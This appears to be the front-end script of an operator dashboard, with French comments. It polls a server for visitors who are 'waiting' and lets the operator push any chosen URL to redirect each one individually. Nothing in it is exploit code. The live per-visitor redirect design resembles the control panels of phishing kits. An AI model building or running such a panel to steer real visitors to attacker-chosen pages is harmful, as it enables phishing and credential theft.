<div class="container">

<div class="card">

<h2>Visiteurs en attente</h2>

<div id="message"
     class="message">
</div>

<div id="visitors">

    <div class="empty">
        Recherche de visiteurs...
    </div>

</div>

</div>

</div>


<script>

/*
 * Stockage local des éléments visiteurs.
 * Cela permet de ne pas recréer le champ URL
 * à chaque actualisation.
 */
const visitorElements = new Map();


async function loadVisitors() {

    try {

        const response =
            await fetch(
                "api.php?t=" +
                Date.now()
            );

        const data =
            await response.json();

        const container =
            document.getElementById(
                "visitors"
            );


        /*
         * Si aucun visiteur n'est présent
         */
        if (
            !data.visitors ||
            data.visitors.length === 0
        ) {

            /*
             * On supprime uniquement
             * les anciens visiteurs.
             */
            visitorElements.clear();

            container.innerHTML = `
                <div class="empty">
                    Aucun visiteur en attente.
                </div>
            `;

            return;
        }


        /*
         * Supprime le message
         * "Aucun visiteur".
         */
        const empty =
            container.querySelector(
                ".empty"
            );

        if (empty) {
            empty.remove();
        }


        /*
         * Liste des visiteurs actuellement
         */
        const currentIds =
            new Set();


        data.visitors.forEach(
            visitor => {

                const visitorId =
                    String(visitor.id);

                currentIds.add(
                    visitorId
                );


                /*
                 * Si le visiteur existe déjà,
                 * on ne recrée PAS son HTML.
                 *
                 * Donc le contenu du champ URL
                 * reste intact.
                 */
                if (
                    visitorElements.has(
                        visitorId
                    )
                ) {

                    return;
                }


                /*
                 * Création du visiteur
                 */
                const div =
                    document.createElement(
                        "div"
                    );

                div.className =
                    "visitor";

                div.dataset.visitorId =
                    visitorId;


                /*
                 * Badge
                 */
                const status =
                    document.createElement(
                        "span"
                    );

                status.className =
                    "status";

                status.textContent =
                    "● En ligne";


                /*
                 * ID
                 */
                const idDiv =
                    document.createElement(
                        "div"
                    );

                idDiv.className =
                    "id";

                idDiv.textContent =
                    "ID : " +
                    visitorId;


                /*
                 * Champ URL
                 */
                const input =
                    document.createElement(
                        "input"
                    );

                input.type =
                    "url";

                input.className =
                    "url-input";

                input.placeholder =
                    "https://example.com";


                /*
                 * Bouton
                 */
                const button =
                    document.createElement(
                        "button"
                    );

                button.type =
                    "button";

                button.textContent =
                    "Rediriger";


                button.addEventListener(
                    "click",
                    function () {

                        redirectVisitor(
                            visitorId,
                            button
                        );

                    }
                );


                /*
                 * Assemblage
                 */
                div.appendChild(
                    status
                );

                div.appendChild(
                    idDiv
                );

                div.appendChild(
                    input
                );

                div.appendChild(
                    button
                );


                container.appendChild(
                    div
                );


                /*
                 * On mémorise cet élément.
                 */
                visitorElements.set(
                    visitorId,
                    div
                );

            }
        );


        /*
         * Supprime uniquement les visiteurs
         * qui ne sont plus actifs.
         */
        for (
            const [
                visitorId,
                element
            ]
            of visitorElements
        ) {

            if (
                !currentIds.has(
                    visitorId
                )
            ) {

                element.remove();

                visitorElements.delete(
                    visitorId
                );
            }
        }

    } catch (error) {

        console.error(
            "Erreur lors du chargement des visiteurs :",
            error
        );

    }
}


async function redirectVisitor(
    visitorId,
    button
) {

    const parent =
        button.parentElement;

    const input =
        parent.querySelector(
            ".url-input"
        );

    const url =
        input.value.trim();


    if (!url) {

        alert(
            "Entrez une URL."
        );

        return;
    }


    /*
     * Vérification simple de l'URL
     */
    try {

        new URL(url);

    } catch (error) {

        alert(
            "Veuillez entrer une URL valide."
        );

        return;
    }


    /*
     * Désactive le bouton pendant
     * l'envoi.
     */
    button.disabled = true;

    button.textContent =
        "Envoi...";


    try {

        const response =
            await fetch(
                "api.php",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        visitor_id:
                            visitorId,

                        url:
                            url
                    })
                }
            );


        const data =
            await response.json();


        if (!response.ok) {

            button.disabled =
                false;

            button.textContent =
                "Rediriger";

            alert(
                data.error ||
                "Erreur."
            );

            return;
        }


        button.textContent =
            "Redirection envoyée";


        showMessage(
            "Redirection envoyée au visiteur."
        );


    } catch (error) {

        button.disabled =
            false;

        button.textContent =
            "Rediriger";

        alert(
            "Erreur de communication avec le serveur."
        );

    }
}


function showMessage(text) {

    const message =
        document.getElementById(
            "message"
        );

    message.textContent =
        text;

    message.style.display =
        "block";


    setTimeout(
        () => {

            message.style.display =
                "none";

        },
        3000
    );
}


/*
 * Première récupération
 */
loadVisitors();


/*
 * Actualisation toutes les 2 secondes.
 *
 * IMPORTANT :
 * loadVisitors() ne recrée plus
 * les visiteurs déjà présents.
 *
 * Le champ URL ne sera donc
 * plus effacé.
 */
setInterval(
    loadVisitors,
    2000
);

</script>

